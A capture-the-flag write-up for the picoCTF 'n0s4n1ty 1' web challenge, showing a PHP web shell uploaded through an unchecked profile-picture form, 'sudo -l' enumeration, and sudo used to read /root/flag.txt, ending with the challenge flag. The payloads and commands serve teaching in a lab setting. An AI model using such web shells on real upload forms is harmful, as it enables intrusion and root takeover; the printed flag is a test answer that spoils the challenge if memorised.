# n0s4n1ty 1 – picoCTF (Web Exploitation)

## Question
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

---

## Process

1. **Testing the Upload**
   - Initially, I attempted uploading random image files.  
   - The server accepted them without strong validation, suggesting that file extensions were not being properly checked.  
   - This indicated a potential **file upload vulnerability** where arbitrary files (including PHP scripts) could be executed.

2. **Crafting a PHP Web Shell**
   - I created a simple PHP file containing a system command:
     ```php
     <?php system("ls /"); ?>
     ```
   - Saved the file with a `.php` extension and uploaded it through the picture upload form.  
   - After navigating to the upload directory on the server, the script executed successfully and displayed the contents of the root filesystem:
     ```
     bin  boot  challenge  dev  etc  home  lib  lib64  media  mnt  
     opt  proc  root  run  sbin  srv  sys  tmp  usr  var
     ```
   - This confirmed that arbitrary command execution was possible.

3. **Privilege Investigation**
   - Since the flag is typically stored in `/root/flag.txt`, I attempted to check permissions.  
   - I executed:
     ```php
     <?php system("sudo -l"); ?>
     ```
   - The result was:
     ```
     Matching Defaults entries for www-data on challenge:
         env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
     User www-data may run the following commands on challenge:
         (ALL) NOPASSWD: ALL
     ```
   - This confirmed that the `www-data` user can run **all commands as root without a password**.

4. **Accessing the Flag**
   - I listed the contents of `/root`:
     ```bash
     sudo ls /root
     ```
     Output:
     ```
     flag.txt
     ```
   - Finally, I read the flag:
     ```bash
     sudo cat /root/flag.txt
     ```

---

## Key Idea
Upload a PHP shell through poorly validated file upload 
Execute system commands via uploaded PHP script  
Enumerate privileges with `sudo -l`  
Misconfigured sudo allows full root access (NOPASSWD: ALL)  
Use sudo to read /root/flag.txt and retrieve the flag  

# Flag
```bash
picoCTF{wh47_c4n_u_d0_wPHP_7189176f}
```
